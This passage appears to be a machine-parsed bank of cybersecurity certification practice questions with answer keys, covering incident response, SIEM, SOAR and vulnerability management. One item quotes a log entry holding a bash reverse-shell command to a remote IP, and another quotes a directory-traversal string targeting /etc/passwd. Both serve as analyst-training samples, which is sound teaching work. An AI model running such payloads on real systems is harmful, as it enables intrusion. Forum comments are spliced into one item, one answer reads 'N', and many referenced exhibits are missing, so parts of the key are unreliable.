s (the email bypassed security controls).\nMalicious file not opened → The payload was never run, so the attack was stopped before Execution.\nNo signs of lateral movement or discovery → Since the file wasn’t executed, the attacker couldn’t explore the environment or move to other systems.\nupvoted 2 times\n  bes_i 5 months, 3 weeks ago\nSelected Answer: B\n_________________B\nupvoted 2 times\n  3be4e12 9 months, 1 week ago\nSelected Answer: B\nSo, was the attack stopped at Initial Access?\nNot quite. The Initial Access attempt occurred, but it wasn't successful. The attack was stopped before or at the Execution phase, because the\nmalicious file was never opened.\nSummary:\nInitial Access: Attempted   ✅\nExecution: Prevented   ✅ → This is where the attack was stopped\nSo while Initial Access is relevant to the scenario, the correct answer to “where was the attack stopped?” is still: B. Execution\nWhy not the others?"}, {"letter": "A", "text": "Lateral Movement\n→ This phase involves moving between systems after gaining access. The attacker never got that far."}, {"letter": "C", "text": "Initial Access\n→ The phishing email was delivered, but access wasn’t achieved because the file wasn’t opened."}, {"letter": "D", "text": "Discovery\n→ This phase involves the attacker exploring the environment. Again, the attack didn’t reach this stage.\nupvoted 3 times\n  EfaChux 10 months ago\nSelected Answer: C\nIt says users did not open, so there was no execution. This has to be initial access.\nupvoted 2 times\n  huffery 10 months, 4 weeks ago\nSelected Answer: C\nExplanation:\nThe phishing email represents an attempt to gain initial access by delivering a malicious file.\nSince users did not open the file, the attack was stopped before the attacker could execute code or move further into the environment.\nThe attack did not progress beyond initial access phase.\nupvoted 4 times"}], "answer": "N"}, {"id": 474, "question": "During the triage of a SIEM alarm, a security analyst identifies the following activity on a .bash_history file:\nWhich of the following actions should the analyst take?", "options": [{"letter": "A", "text": "Declare an incident and look for data exfiltration."}, {"letter": "B", "text": "Declare an incident and look for lateral movements."}, {"letter": "C", "text": "Declare a false positive and close the alarm."}, {"letter": "D", "text": "Declare an incident and look for malware in the affected machine."}], "answer": "A"}, {"id": 475, "question": "Which of the following is the appropriate phase in the incident response process to perform a vulnerability scan to determine the effectiveness of\ncorrective actions?", "options": [{"letter": "A", "text": "Lessons learned"}, {"letter": "B", "text": "Reporting"}, {"letter": "C", "text": "Recovery"}, {"letter": "D", "text": "Root cause analysis"}], "answer": "A"}, {"id": 476, "question": "A security analyst identifies the following log entry in the web server logs:\n10.203.10.23 - - [22/May/2024 11:06:29] \"GET /admin?cmd=bash+-i+>%26+/dev/tcp/10.20.10.22/1234+0%3E%261 http/1.1\" 200 -\nWhich of the following best explains the log entry?", "options": [{"letter": "A", "text": "This was caused by an administrator logging in to a website using the command line."}, {"letter": "B", "text": "This is a successful lateral movement abusing an RCE vulnerability."}, {"letter": "C", "text": "This is a failed attack attempting to exploit an LFI vulnerability."}, {"letter": "D", "text": "This was caused by a successful RFI vulnerability exploitation."}], "answer": "B"}, {"id": 477, "question": "A security analyst receives an alert with the following packet capture:\nWhich of the following conclusions should the analyst reach about this incident?", "options": [{"letter": "A", "text": "EnCase is enumerating a server."}, {"letter": "B", "text": "A Nessus proxy is manipulating traffic."}, {"letter": "C", "text": "An Nmap scan is occurring."}, {"letter": "D", "text": "Metasploit is installing on a target."}], "answer": "C"}, {"id": 478, "question": "An after-action review of a ransomware attack on a company identified deficiencies in responsiveness and consistency. Which of the following\nchoices would best facilitate improvement of these deficiencies?", "options": [{"letter": "A", "text": "Leverage a SIEM."}, {"letter": "B", "text": "Utilize threat intelligence sharing."}, {"letter": "C", "text": "Source multiple threat feeds."}, {"letter": "D", "text": "Implement SOAR."}], "answer": "D"}, {"id": 479, "question": "A security analyst is performing a malware analysis on a device and receives the following instructions:\n• Reduce the blast radius of the potential threat.\n• Preserve forensic data for post-incident analysis.\n• If securely possible, preserve connectivity for live analysis.\nWhich of the following will best help the analyst during the investigation?", "options": [{"letter": "A", "text": "Configure an EDR agent to isolate the network with authorized exceptions to the NOC VLAN."}, {"letter": "B", "text": "Execute a SOAR playbook to trigger a malware scan on the company's assets."}, {"letter": "C", "text": "Use file integrity monitoring to determine if the suspicious file was modified."}, {"letter": "D", "text": "Collect the suspicious file using SFTP and reimage the device."}], "answer": "A"}, {"id": 480, "question": "Which of the following is the practice of controlling how evidence is handled to ensure its integrity during an investigation?", "options": [{"letter": "A", "text": "Chain of custody"}, {"letter": "B", "text": "Root cause analysis"}, {"letter": "C", "text": "Incident response"}, {"letter": "D", "text": "Evidence collection"}], "answer": "A"}, {"id": 481, "question": "A security manager reviews the permissions for the approved users of a shared folder and finds accounts that are not on the approved access list.\nWhile investigating an incident, a user discovers data discrepancies in the file. Which of the following best describes this activity?", "options": [{"letter": "A", "text": "Filesystem anomaly"}, {"letter": "B", "text": "Illegal software"}, {"letter": "C", "text": "Unauthorized changes"}, {"letter": "D", "text": "Data exfiltration"}], "answer": "C"}, {"id": 482, "question": "A SOC analyst is reviewing the weekly EDR report. The report shows that the same application was blocked once every 24 hours. Which of the\nfollowing tools should the analyst use to further investigate the incident?", "options": [{"letter": "A", "text": "Registry Editor"}, {"letter": "B", "text": "services.msc"}, {"letter": "C", "text": "Task Scheduler"}, {"letter": "D", "text": "MSConfig"}], "answer": "C"}, {"id": 483, "question": "A finance department employee opens an unsolicited email that contains a malicious payload. The payload quickly spreads through the finance\ndepartment, but does not affect other departments. Which of the following best explains why the payload does not affect all departments?", "options": [{"letter": "A", "text": "OS version"}, {"letter": "B", "text": "Offline computers"}, {"letter": "C", "text": "Firewall configuration"}, {"letter": "D", "text": "Network segmentation"}], "answer": "D"}, {"id": 484, "question": "A security analyst is responding to an incident that is related to an unauthorized communication between systems. While triaging the event, the\nanalyst obtains the following outputs:\nWhich of the following commands should the analyst use to terminate the malicious session?", "options": [{"letter": "A", "text": "kill -9 4347"}, {"letter": "B", "text": "kill -9 6015"}, {"letter": "C", "text": "kill -9 701"}, {"letter": "D", "text": "kill -9 5996"}], "answer": "D"}, {"id": 485, "question": "Which of the following explains why a company would consider enriching data before sending it to the SIEM?", "options": [{"letter": "A", "text": "To prevent injection attacks against the log management system"}, {"letter": "B", "text": "To reduce the amount and cost of data storage for security incidents"}, {"letter": "C", "text": "To provide more information to SOC analysts when analyzing events"}, {"letter": "D", "text": "To normalize the data before saving it to the database tables"}], "answer": "C"}, {"id": 486, "question": "A company suspects a coordinated effort to attack their platform. Web server logs show malicious activity from many different source IP\naddresses located in different countries. Which of the following will best help a security analyst identify the requests connected to this campaign?", "options": [{"letter": "A", "text": "Modify the web server logs to include the X-Forwarded-For header."}, {"letter": "B", "text": "Create a custom SIEM query to integrate threat intel IoCs associated with the threat actor."}, {"letter": "C", "text": "Enrich the web server request logs with full WHOIS data on all available sources."}, {"letter": "D", "text": "Add GeoIP location for the source IP addresses to the log entries."}], "answer": "B"}, {"id": 487, "question": "The DevSecOps team is remediating an SSRF issue on the company's public-facing website. Which of the following is the best mitigation\ntechnique to address this issue?", "options": [{"letter": "A", "text": "Place a WAF in front of the web server."}, {"letter": "B", "text": "Install a CASB in front of the web server"}, {"letter": "C", "text": "Put a forward proxy in front of the web server."}, {"letter": "D", "text": "Implement MFA in front of the web server"}], "answer": "A"}, {"id": 488, "question": "A security analyst wants to implement new monitoring controls in order to find abnormal account activity for traveling employees. Which of the\nfollowing techniques would deliver the expected results?", "options": [{"letter": "A", "text": "Malicious command interpretation"}, {"letter": "B", "text": "Network monitoring"}, {"letter": "C", "text": "User behavior analysis"}, {"letter": "D", "text": "SSL inspection"}], "answer": "C"}, {"id": 489, "question": "A SOC manager is looking for a solution that can improve the response time and execute predetermined instructions. Which of the following is the\nbest solution based on these requirements?", "options": [{"letter": "A", "text": "XDR"}, {"letter": "B", "text": "SIEM"}, {"letter": "C", "text": "CASB"}, {"letter": "D", "text": "SOAR"}], "answer": "D"}, {"id": 490, "question": "Which of the following is the best technical method to protect sensitive data at an organizational level?", "options": [{"letter": "A", "text": "Deny all traffic on port 8080 with sensitive information on the VLAN."}, {"letter": "B", "text": "Develop a Python script to review email traffic for PII."}, {"letter": "C", "text": "Employ a restrictive policy for the use and distribution of sensitive information."}, {"letter": "D", "text": "Implement a DLP for all egress and ingress of sensitive information on the network."}], "answer": "D"}, {"id": 491, "question": "A company wants to grant access to identity administrators who are completing similar tasks. Which of the following access control models\nshould the company use?", "options": [{"letter": "A", "text": "Mandatory access"}, {"letter": "B", "text": "Role-based access"}, {"letter": "C", "text": "Attribute-based access"}, {"letter": "D", "text": "Discretionary access"}], "answer": "B"}, {"id": 492, "question": "A DevOps analyst implements a webhook to trigger code vulnerability scanning for submissions to the repository. Which of the following is the\nprimary benefit of this enhancement?", "options": [{"letter": "A", "text": "To increase coverage by making the process occur automatically with uploads"}, {"letter": "B", "text": "To create a single pane of glass dashboard for the vulnerability management process"}, {"letter": "C", "text": "To include a threat feed component into the software development life cycle"}, {"letter": "D", "text": "To employ data enrichment for new code commits to enhance project documentation"}], "answer": "A"}, {"id": 493, "question": "A security analyst is looking for information that would serve as an indicator that a given IP address is Involved in other attacks. Which of the\nfollowing sources of information should the analyst use to achieve this objective?", "options": [{"letter": "A", "text": "AbuseIPDB"}, {"letter": "B", "text": "Autonomous System Number"}, {"letter": "C", "text": "Whois"}, {"letter": "D", "text": "Cuckoo Sandbox"}], "answer": "A"}, {"id": 494, "question": "A security analyst is assessing the security of a cloud environment. The following output is generated when the assessment runs:\nAuthentication error -\nInstance not found on preset location\nWhich of the following should the analyst use to fix the issue?", "options": [{"letter": "A", "text": "run module_name and exec"}, {"letter": "B", "text": "--session and --module-args=\" \""}, {"letter": "C", "text": "set_regions and set_key"}, {"letter": "D", "text": "--whoami and --data"}], "answer": "C"}, {"id": 495, "question": "An organization's Chief Information Security Officer (CISO) is organizing a tabletop drill. The CISO has included several other executives in the\nmeeting invitation for the drill, as required. Which of the following is the best reason for including the Chief Communications Officer?", "options": [{"letter": "A", "text": "Deciding when and how to issue press releases regarding incidents can minimize damage to the organization's brand reputation."}, {"letter": "B", "text": "All of the organization's high-level executives should know about the IT department's incident response plan."}, {"letter": "C", "text": "All parties must be able to communicate clearly. concisely, and consistently during incident response."}, {"letter": "D", "text": "The CISO would like to increase the security department's visibility to senior executives."}], "answer": "A"}, {"id": 496, "question": "An organization wants to implement an identity and access management technology that is resistant to phishing attacks. Which of the following\nis the best technology to implement?", "options": [{"letter": "A", "text": "Federation"}, {"letter": "B", "text": "Privileged access management"}, {"letter": "C", "text": "Passwordless authentication"}, {"letter": "D", "text": "Single sign-on"}], "answer": "C"}, {"id": 497, "question": "A security analyst discovers that, over three months, an attacker has slowly created multiple accounts on a web server while avoiding detection.\nWhich of the following best describes this threat actor?", "options": [{"letter": "A", "text": "Script kiddie threat actor"}, {"letter": "B", "text": "Advanced persistent threat actor"}, {"letter": "C", "text": "Insider threat actor"}, {"letter": "D", "text": "Hacktivist threat actor"}], "answer": "B"}, {"id": 498, "question": "A SOC manager who recently switched companies notices that their new company's SOC analysts have significantly poorer operational metrics\ncompared to their previous company, without any major difference in alert volume or team size. Which of the following are most likely to be the\ncause? (Choose two.)", "options": [{"letter": "A", "text": "Use of OSSTMM"}, {"letter": "B", "text": "Integration of webhooks"}, {"letter": "C", "text": "Lack of SOAR implementation"}, {"letter": "D", "text": "Absence of single pane of glass"}, {"letter": "E", "text": "Morale issues among SOC staff"}, {"letter": "F", "text": "Usage of API gateways"}], "answer": "CE"}, {"id": 499, "question": "The architecture team has been given a mandate to reduce the triage time of phishing incidents by 20%. Which of the following solutions will most\nlikely help with this effort?", "options": [{"letter": "A", "text": "Integrate a SOAR platform."}, {"letter": "B", "text": "Increase the budget to the security awareness program."}, {"letter": "C", "text": "Implement an EDR tool."}, {"letter": "D", "text": "Create new correlation rules for the SIEM."}], "answer": "A"}, {"id": 500, "question": "A security analyst is testing a web application for vulnerabilities using Burp Suite. During the assessment, a capture of the following HTTP request\nand response is shown in the command-line interface:\nAfter inspecting the request, the security analyst notices that it does not include any additional protections or validation mechanisms. Which of\nthe following vulnerabilities is most likely present in the web application?", "options": [{"letter": "A", "text": "IDOR"}, {"letter": "B", "text": "CSRF"}, {"letter": "C", "text": "SQLi"}, {"letter": "D", "text": "XSS"}], "answer": "B"}, {"id": 501, "question": "When undertaking a cloud migration of multiple SaaS applications, an organization's systems administrators struggled with the complexity of\nextending identity and access management to cloud-based assets. Which of the following service models would have reduced the complexity of\nthis project?", "options": [{"letter": "A", "text": "RADIUS"}, {"letter": "B", "text": "SDN"}, {"letter": "C", "text": "ZTNA"}, {"letter": "D", "text": "SWG"}], "answer": "C"}, {"id": 502, "question": "A security analyst is working on a suspicious email forwarded from a user. The email contains an attachment asking the user to open it. Which of\nthe following should the security analyst review to best determine email authentication and its attack origin?", "options": [{"letter": "A", "text": "DMARC"}, {"letter": "B", "text": "SMTP"}, {"letter": "C", "text": "Joe Sandbox"}, {"letter": "D", "text": "URL rewriting"}], "answer": "A"}, {"id": 503, "question": "A company discovers that its proprietary information is being sold on the dark web. A security analyst uses threat hunting to search for signs of\ncompromise. After running a network packet capture tool, the analyst identifies millions of packets similar to the following:\nThe analyst does not detect or identify any other abnormalities. Which of the following is most likely the malicious activity in this scenario?", "options": [{"letter": "A", "text": "An insider is using an IP command-and-control to sell proprietary information."}, {"letter": "B", "text": "A threat actor is performing exfiltration over an alternative protocol."}, {"letter": "C", "text": "A machine was infected with a virus that is trying to propagate."}, {"letter": "D", "text": "A hacktivist is conducting an ICMP DDoS attack against the company."}], "answer": "B"}, {"id": 504, "question": "An incident responder is investigating a possible server data exfiltration incident with the intent to prosecute if necessary. The responder:\n• Captures live memory and an image of the drives.\n• Is given a copy of the firewall logs.\n• Pulls the drives from the server.\nWhich of the following would most likely create an issue?", "options": [{"letter": "A", "text": "Lack of network capture"}, {"letter": "B", "text": "Chain of custody failure"}, {"letter": "C", "text": "Corrupt drives"}, {"letter": "D", "text": "Encrypted files"}], "answer": "B"}, {"id": 505, "question": "A company reports that user plain text credentials have been disclosed from their network. A security analyst is identifying the vulnerability and\nruns a scan to receive the following:\nWhich of the following computers is the source of the leaked credentials?", "options": [{"letter": "A", "text": "10.205.8.14"}, {"letter": "B", "text": "10.205.8.15"}, {"letter": "C", "text": "10.205.8.16"}, {"letter": "D", "text": "10.205.8.17"}], "answer": "D"}, {"id": 506, "question": "A security analyst receives the following information about the company's systems. They need to prioritize which systems should be given the\nresources to improve security.\nWhich of the following systems should the analyst remediate first?", "options": [{"letter": "A", "text": "Computer1"}, {"letter": "B", "text": "Server1"}, {"letter": "C", "text": "Computer2"}, {"letter": "D", "text": "Server2"}], "answer": "B"}, {"id": 507, "question": "To comply with regulatory requirements, the Chief Executive Officer (CEO) must lead the company through simulations to find which steps are\nmissing m emergency situations or incident processes. Which of the following should the CEO do?", "options": [{"letter": "A", "text": "Implement the incident response plan."}, {"letter": "B", "text": "Leverage the appropriate playbook."}, {"letter": "C", "text": "Develop a business continuity plan."}, {"letter": "D", "text": "Perform a tabletop exercise."}], "answer": "D"}, {"id": 508, "question": "During a routine review of DNS logs, a security analyst observes that Host X has been making frequent DNS requests to domains with random\nalphanumeric strings (e.g.. atd8ekthj.xyz). IPS anomaly rules are blocking these domains. This behavior started shortly after a new software\nInstallation on the host. Which of the following should the analyst do first to determine whether Host X has been compromised?", "options": [{"letter": "A", "text": "Allow the domains because the DNS requests are part of a misconfigured software update."}, {"letter": "B", "text": "Check the software installation logs for errors and reinstall the software."}, {"letter": "C", "text": "Block all outbound connections from the host to prevent further DNS queries."}, {"letter": "D", "text": "Use threat intelligence to check if the queried domains are associated with legitimate sites."}], "answer": "D"}, {"id": 509, "question": "The website of a large retail chain is falling to enforce encrypted HTTPS connections, leaving customer account credentials exposed. Which of the\nfollowing is the best corrective action for resolving this issue?", "options": [{"letter": "A", "text": "Remove any redirect settings of HTTP connections to HTTPS."}, {"letter": "B", "text": "Implement HTTP Strict Transport Security Headers."}, {"letter": "C", "text": "Install a self-signed certificate on the web server."}, {"letter": "D", "text": "Reduce the default timeout period for all web-based sessions."}], "answer": "B"}, {"id": 510, "question": "A security analyst investigates a malware alert from a critical system. The following information is present in the ticket:\nWhich of the following should the analyst do first?", "options": [{"letter": "A", "text": "Block the suspicious IP address 128.210.175.23."}, {"letter": "B", "text": "Determine whether sssh is a malicious program."}, {"letter": "C", "text": "Delete the suspicious files."}, {"letter": "D", "text": "Review the Apache logs."}], "answer": "B"}, {"id": 511, "question": "An application security analyst needs to test a web application for input validation vulnerabilities. The analyst does not have the source code and\ndoes not have documentation for the APIs. Which of the following techniques will best aid the analyst in vulnerability testing?", "options": [{"letter": "A", "text": "Fuzzing operation"}, {"letter": "B", "text": "Agentless scanning"}, {"letter": "C", "text": "Reverse engineering"}, {"letter": "D", "text": "Use of a SAST tool"}], "answer": "A"}, {"id": 512, "question": "A security analyst IS comparing the results of the past and current active credentialed vulnerability scans:\nPast scan:\nCurrent scan:\nWhich of the following should the analyst do next?", "options": [{"letter": "A", "text": "Try to avoid a data leak by immediately creating a self-signed TLS certificate to patch the NTP system."}, {"letter": "B", "text": "Inform management about the risk that the company’s assets will be used to perform attacks."}, {"letter": "C", "text": "Create a new entry on the risk register saying that all significant risks have been mitigated."}, {"letter": "D", "text": "Request an unauthenticated scan to confirm that vulnerabilities have been patched."}], "answer": "B"}, {"id": 513, "question": "An analyst reviews the following web server log entries:\n%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd\nNo attacks or malicious attempts have been discovered. Which of the following most likely describes what took place?", "options": [{"letter": "A", "text": "A SQL injection query took place to gather information from a sensitive file."}, {"letter": "B", "text": "A PHP injection was leveraged to ensure that the sensitive file could be accessed."}, {"letter": "C", "text": "Base64 was used to prevent the IPS from detecting the fully encoded string."}, {"letter": "D", "text": "Directory traversal was performed to obtain a sensitive file for further reconnaissance."}], "answer": "D"}, {"id": 514, "question": "The security team is reviewing a list of vulnerabilities present on the environment, and they want to prioritize the remediation based on the CVSS\nv4.0 metrics:\nWhich of the following vulnerabilities should the security manager request to fix first?", "options": [{"letter": "A", "text": "System A"}, {"letter": "B", "text": "System B"}, {"letter": "C", "text": "System C"}, {"letter": "D", "text": "System D"}, {"letter": "E", "text": "System E"}], "answer": "D"}, {"id": 515, "question": "A security analyst is investigating an unusually high volume of requests received on a web server. Based on the following command and output:\nWhich of the following best describes the activity that the analyst will confirm?", "options": [{"letter": "A", "text": "SQL injection"}, {"letter": "B", "text": "Directory brute force"}, {"letter": "C", "text": "Remote command execution"}, {"letter": "D", "text": "Cross-site scripting"}], "answer": "B"}, {"id": 516, "question": "A security analyst discovers multiple log entries from a recently acquired tool that was bundled as a YUM package. Those entries point to\nattempts of privilege escalation. Which of the following Is the most likely explanation?", "options": [{"letter": "A", "text": "The package was modified during installation."}, {"letter": "B", "text": "The package was missing critical DLL files."}, {"letter": "C", "text": "The package got corrupted while being downloaded."}, {"letter": "D", "text": "The package was installed without a GPG check."}], "answer": "D"}, {"id": 517, "question": "A company wants to implement protection mechanisms after an incident in which customer information was sent to a third party. Which of the\nfollowing tools should the company implement?", "options": [{"letter": "A", "text": "SIEM"}, {"letter": "B", "text": "EDR"}, {"letter": "C", "text": "CASB"}, {"letter": "D", "text": "DLP"}], "answer": "D"}, {"id": 518, "question": "A security analyst is implementing a process to perform vulnerability management on an ОТ environment:\n• Systems must remain on an isolated network.\n• The process should focus on external threats.\n• No additional software can be deployed on the systems.\n• Transmitted packets cannot be modified or dropped.\n• Additional processing delays are not tolerated.\nWhich of the following is the best way to securely meet the requirements?", "options": [{"letter": "A", "text": "Implement agentless sensors at the network edge."}, {"letter": "B", "text": "Use reverse engineering to detect flaws on the in-scope systems."}, {"letter": "C", "text": "Deploy an IPS In-line with the network traffic."}, {"letter": "D", "text": "Check the compatibility of an EDR agent with the OSs used on the ОТ environment."}], "answer": "A"}, {"id": 519, "question": "HOTSPOT\n-\nA healthcare organization must develop an action plan based on the findings from a risk assessment. The action plan must consist of a\nrecommended list of security controls.\nINSTRUCTIONS\n-\nSelect the appropriate control to implement for each risk finding. Findings may be used only once.\nIf at any time you would like to bring back the initial state of the simulation, please click the Reset All button.", "options": [{"letter": "", "text": "No answer choices parsed. Use the PDF for this PBQ/image-based item."}], "answer": ""}, {"id": 520, "question": "A managed service provider manages servers in customer-assigned Internet Protocol spaces. The provider discovers that these servers are not\nincluded in scheduled network scans, but the provider cannot scan the servers without the customers' explicit permission. Which of the following\nscanning methods should the provider use to scan these individual servers?", "options": [{"letter": "A", "text": "Agent-based scans"}, {"letter": "B", "text": "System baseline scans"}, {"letter": "C", "text": "External network scans"}, {"letter": "D", "text": "Device fingerprinting"}], "answer": "A"}, {"id": 521, "question": "An organization’s security operations center (SOC) team prioritizes confidentiality and integrity over monetary considerations. The SOC team\ncontains a quickly progressing ransomware incident. Which of the following factors motivated the SOC team to take this action? (Choose two.)", "options": [{"letter": "A", "text": "Attack vector"}, {"letter": "B", "text": "Risk appetite"}, {"letter": "C", "text": "Scope"}, {"letter": "D", "text": "Impact"}, {"letter": "E", "text": "Common Vulnerability Scoring System (CVSS) score"}, {"letter": "F", "text": "Asset value"}], "answer": "BD"}, {"id": 522, "question": "A security analyst is analyzing two vulnerabilities on a critical router. The analyst must choose only one to patch during this maintenance window.\nGiven the following information:\nVulnerability 1 has not received a CVSS score. The vulnerability has the following characteristics:\n• Must be logged in to the router, but elevated privileges are not required\n• Trivial to exploit, but user interaction is needed\n• Low impact to availability, but high impact to confidentiality and integrity\nVulnerability 2 has a CVSS score of AV:C:L/PR:L/UI:N/S:U/C:L/I:L/A:H\nWhich of the following conclusions should the analyst reach?", "options": [{"letter": "A", "text": "Patch Vulnerability 1 because it has a higher overall impact when looking at confidentiality, integrity, and availability, and it requires lower\nprivileges."}, {"letter": "B", "text": "Patch Vulnerability 1 because it is easier to exploit and has a higher impact on confidentiality."}, {"letter": "C", "text": "Patch Vulnerability 2 because it has a higher overall impact when looking at confidentiality, integrity, and availability, and it can be exploited\nby a privileged user."}, {"letter": "D", "text": "Patch Vulnerability 2 because it is easier to exploit, has a high impact on availability, and it is more likely to be exploited remotely."}], "answer": "D"}, {"id": 523, "question": "Which of the following should a cybersecurity analyst utilize when a notification is inaccurate?", "options": [{"letter": "A", "text": "Data enrichment"}, {"letter": "B", "text": "Dashboard creation"}, {"letter": "C", "text": "Threat hunting"}, {"letter": "D", "text": "Alert tuning"}], "answer": "D"}, {"id": 524, "question": "Which of the following are characteristics of Zero Trust Network Access?", "options": [{"letter": "A", "text": "Application programming interface security and continuous monitoring"}, {"letter": "B", "text": "A gateway controller and agent flows"}, {"letter": "C", "text": "Virtualization and data protection"}, {"letter": "D", "text": "An attack surface and a protect surface"}], "answer": "D"}, {"id": 525, "question": "A security operations (SOC) manager develops response mechanisms as part of playbook development efforts. The SOC manager needs to\naccomplish the following:\n• Document adversarial activities.\n• Map adversarial activities to a linear progression of sequential phases.\n• Provide broad coverage of threat actions without addressing specific tactics, techniques, and procedures (TTPs).\nWhich of the following is the most reliable source for this information?", "options": [{"letter": "A", "text": "MITRE ATT&CK"}, {"letter": "B", "text": "Cyber COBRA"}, {"letter": "C", "text": "Diamond Model of Intrusion Analysis"}, {"letter": "D", "text": "Cyber Kill Chain"}], "answer": "D"}, {"id": 526, "question": "An analyst reviews alerts that indicate a number of different users had a spike in login attempts from the same IP. Using the security information\nand event management (SIEM) system, the analyst finds that a number of users received the following email:\nWhich of the following best describes this activity?", "options": [{"letter": "A", "text": "URL shortening"}, {"letter": "B", "text": "Whaling"}, {"letter": "C", "text": "Spoofing"}, {"letter": "D", "text": "Social engineering"}], "answer": "C"}, {"id": 527, "question": "An analyst reviews code for a sensitive application for their company and uploads it to an AI platform. This application is critical to the company's\nbusiness operations. Which of the following risks is most important for the analyst to consider?", "options": [{"letter": "A", "text": "Hallucinations"}, {"letter": "B", "text": "Malicious prompts"}, {"letter": "C", "text": "Data exposure"}, {"letter": "D", "text": "Model poisoning"}], "answer": "C"}, {"id": 528, "question": "A spillage incident results in the access of controlled information across multiple unauthorized business units. Which of the following response\ntechniques should be implemented first?", "options": [{"letter": "A", "text": "Analysis and triage"}, {"letter": "B", "text": "Containment and isolation"}, {"letter": "C", "text": "Evidence and legal hold"}, {"letter": "D", "text": "Escalation and monitoring"}], "answer": "B"}, {"id": 529, "question": "An analyst uses an AI platform to help correlate events. The AI output contains events that did not happen. This results in inaccurate correlations.\nWhich of the following best describes what has occurred?", "options": [{"letter": "A", "text": "Hallucinations"}, {"letter": "B", "text": "Data exposure"}, {"letter": "C", "text": "Malicious prompts"}, {"letter": "D", "text": "Model poisoning"}], "answer": "A"}, {"id": 530, "question": "Which of the following best explains the importance of security orchestration, automation, and response for security operation activities?", "options": [{"letter": "A", "text": "Implementing infrastructure as code in the organization"}, {"letter": "B", "text": "Supporting the team's management of remediation tasks"}, {"letter": "C", "text": "Deploying general scripts for automating security engineering operations"}, {"letter": "D", "text": "Collecting threat intelligence feeds for improved threat response"}], "answer": "B"}, {"id": 531, "question": "Which of the following is the term for a predefined set of automated actions that incident responders and SOC analysts can use to enhance\noperations?", "options": [{"letter": "A", "text": "Threat modeling"}, {"letter": "B", "text": "Detection set"}, {"letter": "C", "text": "CVSS"}, {"letter": "D", "text": "Playbooks"}], "answer": "D"}, {"id": 532, "question": "A systems administrator is concerned after reviewing the results of a vulnerability scan:\nWhich of the following mitigation strategies best addresses the risk?", "options": [{"letter": "A", "text": "Create an exception."}, {"letter": "B", "text": "Wait for a patch release."}, {"letter": "C", "text": "Apply compensating controls."}, {"letter": "D", "text": "Disable the affected application."}], "answer": "C"}, {"id": 533, "question": "A critical server hosting final exams for an educational institution fails while students are taking their exams. The final exam deadline is in 16\nhours. Which of the following is the best source for guidance on remediation for the IT team?", "options": [{"letter": "A", "text": "MOU"}, {"letter": "B", "text": "KPI"}, {"letter": "C", "text": "SLA"}, {"letter": "D", "text": "BCP"}], "answer": "D"}, {"id": 534, "question": "A new policy prohibits external access to database servers. A recent external port scan identified the following open Transmission Control\nProtocol (TCP) ports:\n• 21\n• 25\n• 68\n• 80\n• 389\n• 443\n• 587\n• 1514\n• 3306\n• 3389\n• 8080\nWhich of the ports must be closed to be compliant with the new policy? (Choose two.)", "options": [{"letter": "A", "text": "25"}, {"letter": "B", "text": "587"}, {"letter": "C", "text": "1514"}, {"letter": "D", "text": "3306"}, {"letter": "E", "text": "3389"}, {"letter": "F", "text": "8080"}], "answer": "DE"}, {"id": 535, "question": "Which of the following is a reason an executive summary is important for incident response communication?", "options": [{"letter": "A", "text": "It uses quantifiable metrics to identify the root cause."}, {"letter": "B", "text": "It is a concise way for the leadership team to understand the event."}, {"letter": "C", "text": "It is included as part of privacy disclosure statements."}, {"letter": "D", "text": "It provides a detailed explanation of the incident."}], "answer": "B"}, {"id": 536, "question": "A security analyst is reviewing an alert about connections from an IT member to the Chief Privacy Officer's (CPO) laptop. There was abnormal\nnetwork traffic from the CPO's laptop to an unknown server located in the IT legacy network and then to an unknown internet location. Based on\nthe following information:\nWhich of the following best categorizes the detected activity?", "options": [{"letter": "A", "text": "Command-and-control"}, {"letter": "B", "text": "Service disruption"}, {"letter": "C", "text": "Unauthorized access"}, {"letter": "D", "text": "Malicious insider"}], "answer": "D"}, {"id": 537, "question": "Which of the following uses simulated traffic to a website to evaluate performance?", "options": [{"letter": "A", "text": "Log analysis"}, {"letter": "B", "text": "War gaming"}, {"letter": "C", "text": "Synthetic monitoring"}, {"letter": "D", "text": "Packet inspection"}], "answer": "C"}, {"id": 538, "question": "A security analyst responds to an alert regarding identity and access management activity within the cloud environment. The attacker is currently\ntrying to gain access from one isolated cloud subscription to another via a compromised user role. Which of the following aspects of the MITRE\nATT&CK framework is the attacker trying to perform?", "options": [{"letter": "A", "text": "Privilege escalation"}, {"letter": "B", "text": "Lateral movement"}, {"letter": "C", "text": "Persistence"}, {"letter": "D", "text": "Execution"}, {"letter": "E", "text": "Credential access"}], "answer": "B"}, {"id": 539, "question": "Which of the following refers to several identified issues that need remediation after a recent audit?", "options": [{"letter": "A", "text": "Compliance findings"}, {"letter": "B", "text": "Risk scorecard"}, {"letter": "C", "text": "Service-level agreement (SLA)"}, {"letter": "D", "text": "Mean time to detect"}, {"letter": "E", "text": "Mapping scan report"}], "answer": "A"}, {"id": 540, "question": "A vulnerability analyst must perform a security assessment on an edge device running various services. The analyst runs an Nmap port scan and\nsees the following output:\nWhich of the following should the analyst do next to validate the discovered remote access service is secure?", "options": [{"letter": "A", "text": "Verify that the web server certificate is added to certificate store."}, {"letter": "B", "text": "Verify that the Border Gateway Protocol (BGP) route has been published."}, {"letter": "C", "text": "Verify that the virtual private network (VPN) service is utilizing Main Mode."}, {"letter": "D", "text": "Verify that the web server can be pinged."}], "answer": "C"}, {"id": 541, "question": "Which of the following helps identify the attack surface area of a new environment?", "options": [{"letter": "A", "text": "Incident response process"}, {"letter": "B", "text": "Software development life cycle (SDLC)"}, {"letter": "C", "text": "Open Systems Interconnection (OSI) model"}, {"letter": "D", "text": "Cyber Kill Chain"}], "answer": "D"}, {"id": 542, "question": "A security operations center analyst must determine which threat actor is targeting their industry based on similar attack vectors. Which of the\nfollowing provides the best intelligence for attribution?", "options": [{"letter": "A", "text": "AbuseIPDB"}, {"letter": "B", "text": "Spoofing, tampering, repudiation, information disclosure, denial of service, and elevation of privilege"}, {"letter": "C", "text": "Tactics, techniques, and procedures"}, {"letter": "D", "text": "Internet Protocols"}], "answer": "C"}, {"id": 543, "question": "An analyst is assigned to a new cybersecurity improvement project. The analyst wants to better understand the workflow processes and the skill\nset of the cybersecurity engineers on this task force. The analyst sets up a recurring, weekly conference call. Which of the following best\ndescribes the purpose for the conference call?", "options": [{"letter": "A", "text": "To conduct incident response training"}, {"letter": "B", "text": "To create vendor information sessions"}, {"letter": "C", "text": "To manage and facilitate team coordination"}, {"letter": "D", "text": "To respond to customer requirements"}], "answer": "C"}, {"id": 544, "question": "Which of the 